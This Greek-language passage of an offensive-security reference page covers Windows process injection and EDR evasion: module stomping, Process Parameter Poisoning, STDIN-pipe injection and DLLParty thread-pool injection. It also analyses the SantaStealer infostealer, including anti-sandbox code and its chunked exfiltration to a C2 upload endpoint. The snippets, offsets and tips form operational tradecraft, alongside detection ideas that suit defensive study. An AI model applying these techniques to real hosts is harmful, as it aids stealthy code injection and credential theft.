- `NtQueryInformationThread` και στη συνέχεια άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που φτάνουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Ακριβές Module Stomping

Το Module stomping εκτελεί payloads από το **section `.text` ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να δεσμεύει εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο, υποστηριζόμενο από δίσκο image**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει code paths που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην έχει φορτωθεί στην απομακρυσμένη διεργασία, ενώ μια υπερβολικά μικρή περιοχή κώδικα μπορεί να προκαλέσει crash της διεργασίας. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Κατάγραψε τα modules της διεργασίας-στόχου και κράτησε μια **λίστα include μόνο με ονόματα** των DLL που είναι ήδη φορτωμένα.
2. Δημιούργησε πρώτα το payload και κατέγραψε το **ακριβές μέγεθός του σε bytes**.
3. Σάρωσε υποψήφια DLL στον δίσκο και σύγκρινε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται map στη μνήμη**.
4. Κάνε parse τον **Export Address Table (EAT)** και επίλεξε ένα RVA exported function ως αρχικό offset του stomp.
5. Υπολόγισε την **έκταση των επιπτώσεων**: αν το payload υπερβαίνει τα όρια της επιλεγμένης συνάρτησης, θα κάνει overwrite τα γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά βοηθητικά εργαλεία recon/επιλογής που έχουν εντοπιστεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Προτιμήστε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγετε την τηλεμετρία του `LoadLibrary`/τις απροσδόκητες φορτώσεις image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο, διαφορετικά οι κανονικές διαδρομές κώδικα ενδέχεται να εκτελέσουν τα bytes που έχουν υποστεί stomp πριν ή μετά τη δημιουργία του thread.
- Για μεγάλα implants, συχνά χρειάζεται να αλλάξετε την ενσωμάτωση του shellcode από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον πηγαίο κώδικα του injector.

Detection ideas
- Απομακρυσμένες εγγραφές σε εκτελέσιμες σελίδες με backing από image (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Σημεία εισόδου export των οποίων τα bytes στη μνήμη δεν ταιριάζουν πλέον με το αντίστοιχο αρχείο στον δίσκο.
- Απομακρυσμένα threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε export νόμιμου DLL, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη διεργασία-παιδί** και τις αποθηκεύουν στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers που αντιγράφονται από το `CreateProcessW`

Χρήσιμα carriers:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και έχει όριο **32.767 χαρακτήρων Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση στο `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη διεργασία-παιδί με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς API απομακρυσμένης εγγραφής

Μετά τη δημιουργία της διεργασίας-παιδιού, εντοπίστε το αντιγραμμένο buffer με **μόνο για ανάγνωση** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργήστε κανονικά τη διεργασία (όχι σε αναστολή)
2. Κάντε εκτελέσιμη την επιλεγμένη σελίδα παραμέτρων με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που έχει επιστραφεί.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός null byte και staged shellcode

Και οι τρεις φορείς είναι **δεδομένα τύπου string**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **πρώτο στάδιο χωρίς null byte**, το οποίο ανασυνθέτει τις σταθερές κατά τον χρόνο εκτέλεσης και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω στοίβας από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- τοποθετήσει τη συμβολοσειρά/το buffer στη στοίβα του στόχου
- δεσμεύσει το **32-byte shadow space x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 bytes** πριν από την κλήση

Στη συνέχεια, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε μια δέσμευση `PAGE_READWRITE`, να αλλάξει σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να εκτελεστεί με άλμα σε αυτό, αποφεύγοντας μια άμεση δέσμευση RWX.

### Ιδέες για ανίχνευση

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **εκτελέσιμες τις σελίδες παραμέτρων διεργασίας**
- η αλλαγή προστασίας ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές με υψηλή εντροπία στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένας πλήρης μηχανισμός εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων εκτέλεσης και μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Το `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκε από τους συγγραφείς, αλλά απορρίφθηκε επειδή εσωτερικά χρησιμοποιεί ύποπτα primitives, όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Έγχυση μέσω pipe του Console STDIN

Μια διαδραστική διεργασία-παιδί κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο του παιδιού σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στην ιδιωτική του μνήμη, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα thread του παιδιού σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά εξακολουθεί να πρόκειται για process injection και όχι για γενικό EDR bypass.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με μοναδικά ονοματισμένα pipe objects, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles που κληρονομούνται με έναν προεπιλεγμένο security descriptor, τοποθετεί το handle ανάγνωσης στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί ένα νέο παιδί με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο κονσόλας· δεν συνδέει το pipe του σε μια υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση ακολουθεί την εξής αλυσίδα:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` του παιδιού. Απενεργοποιεί την κληρονόμηση στα δύο handles της πλευράς του γονέα και κλείνει τα αντίγραφα της πλευράς του παιδιού στον γονέα μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Το παιδί κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με το `WriteFile`, μέσω του handle `STDIN` της πλευράς του γονέα. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφο σε μία από τις ιδιωτικές, δεσμευμένες περιοχές μνήμης του.
4. Διασχίζει τον χώρο διευθύνσεων του παιδιού με το `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με το `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει το buffer που εντοπίστηκε σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο thread, το αναστέλλει, ορίζει το `RIP` στη διεύθυνση `found_address + 0x19` με το `NtSetContextThread` και συνεχίζει την εκτέλεσή του.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με δείκτη 25 byte, επομένως τα εκτελέσιμα bytes αρχίζουν στο δεκαεξαδικό offset `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε ταυτόχρονα τον δείκτη, το search vector, το μέγεθος του array και το execution offset. Τα σχόλια του κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως μη αποδεκτούς χαρακτήρες. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια του child process.<sup>[[41]](#references)</sup>

Για μικρούς native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Εγχύση DLL μέσω callback του thread pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση thread pool τύπου PoolParty, ώστε ένα υπάρχον worker του target να καλέσει το `LoadLibraryA`, αντί να εκτελέσει ένα injected callback stub. Ο μηχανισμός dispatch είναι ένα `TP_DIRECT` completion που τοποθετείται στην I/O completion port του pool του target. Αυτό δεν παρακάμπτει τα δικαιώματα διεργασίας: το PoC καλεί το `OpenProcess(PROCESS_ALL_ACCESS)` και απαιτεί μνήμη του target με δυνατότητα ανάγνωσης/εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, το worker περνά έναν pointer προς το `TP_CALLBACK_INSTANCE` που βρίσκεται στο stack του, μέσω του `RCX`, του πρώτου ορίσματος του callback. Το `LoadLibraryA` ερμηνεύει τον ίδιο pointer ως `LPCSTR`. Στη διαδρομή που δοκιμάστηκε, το `TppWorkerThread` δημιουργεί τον pointer στη θέση `RSP+0x178`, ενώ η πρώτη συνήθης εγγραφή του σε αυτό το object γίνεται στη θέση `RSP+0x1d0`. Επομένως, μια null-terminated διαδρομή DLL που χωρά στο αρχικό πρόθεμα των 0x58 byte μπορεί να τοποθετηθεί στην αρχή του instance, χωρίς να αντικατασταθεί πριν από το dispatch. Αυτή είναι παρατήρηση ειδική για το συγκεκριμένο build και όχι τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η ροή εργασίας αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumerate τα handles του target με `NtQuerySystemInformation(SystemHandleInformation)` και εντόπισε το `TpWorkerFactory` μέσω αναζήτησης των object types. Αντίγραψε ένα handle worker-factory και έλεγξε το `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το remote `TP_POOL`. Παράλειψε τα factories με `TotalWorkerCount == 0`.
2. Διάβασε το `TP_POOL.CompletionPort` και διέτρεξε τη private worker list του pool. Στο δοκιμασμένο build Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), η κεφαλή της βρίσκεται στη θέση `pool+0x60`· κάθε link βρίσκεται στη θέση `worker+0x10`, επομένως το slot του callback instance στη θέση `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει την ευθυγράμμιση των pointers, την αμοιβαιότητα των links, την ιδιοκτησία του pool, τα μη μηδενικά thread IDs, τους επαναλαμβανόμενους κόμβους και μια σταθερή κεφαλή λίστας.
3. Γράψε τη διαδρομή DLL σε **κάθε** slot worker που ανακτήθηκε, επειδή οποιοδήποτε worker μπορεί να καταναλώσει το queued completion. Τοποθέτησε ένα `TP_DIRECT` σε εγγράψιμη μνήμη του target, με `Callback = LoadLibraryA`. Το PoC χρησιμοποιεί τη θέση `last_slot-0x500` σε stack worker αντί για `VirtualAllocEx`· αυτό το offset είναι πειραματικό και δεν πρέπει να συγκρούεται με ενεργά δεδομένα του stack.
4. Αντέγραψε το handle της completion port του target και κάλεσε `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του remote `TP_DIRECT` είναι το completion key. Ένα υπάρχον worker καλεί τότε το `LoadLibraryA` με τον τροποποιημένο pointer του callback instance, φορτώνοντας ένα DLL στο οποίο έχει ήδη πρόσβαση το target.

Το PoC δέχεται ένα PID target (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια hard-coded διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή προσβάσιμη στο target πριν δημιουργήσετε x64 executable. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως remote callback, επομένως προϋποθέτει ότι αυτή η διεύθυνση είναι έγκυρη στο target. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο πρόθεμα των 0x58 byte ούτε αν η διάσχιση των workers εντόπισε κάποιο slot πριν από την πρόσβαση στο τελευταίο στοιχείο. Επαληθεύστε ξανά τα private offsets, τη διάταξη του stack και τον διαθέσιμο εγγράψιμο χώρο για το συγκεκριμένο build. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή τα telemetry φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Τεχνικές του SantaStealer για fileless evasion και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρύθμισης (`anti_cis`) κάνει enumerate τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί διάταξη κυριλλικού αλφαβήτου, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει τους stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες περιοχές, ενώ αφήνει ένα artifact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Επίπεδη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα προσαρμοσμένο rolling checksum και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes. Επαναλαμβάνει τον υπολογισμό του checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες του συστήματος (ελάχιστο πλήθος διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα VirtualBox additions και πραγματοποιεί ελέγχους χρονισμού γύρω από αναμονές, ώστε να εντοπίσει το single-stepping. Αν εντοπιστεί οποιαδήποτε ένδειξη, η εκτέλεση διακόπτεται προτού ξεκινήσουν τα modules.

### Βοηθητικό πρόγραμμα χωρίς αρχεία + διπλή reflective φόρτωση ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε γράφεται στον δίσκο είτε γίνεται χειροκίνητο mapping στη μνήμη. Στη λειτουργία χωρίς αρχεία, επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται αρχεία του helper.
- Το helper αποθηκεύει ένα δεύτερο DLL σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά των 32 byte + nonce των 12 byte). Μετά και τα δύο περάσματα, φορτώνει το blob με reflective loading (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, που προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν inject σε ένα ενεργό Chromium browser, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν passwords/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Αρθρωτή συλλογή στη μνήμη και HTTP exfil σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει το πλήθος αρχείων του μετά από join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, τα πάντα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει τα `User-Agent: upload`, `auth: <build_id>` και, προαιρετικά, `w: <campaign_tag>`. Στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασύνθεση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής εντοπισμού: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ιστολόγιο](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις χαριστικές ευκαιρίες για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό κέλυφος του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή πρόσοψη: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Η Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Η Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Οπλοποίηση του remediation driver του Defender ως primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας Function Peekaboo της MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole της TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
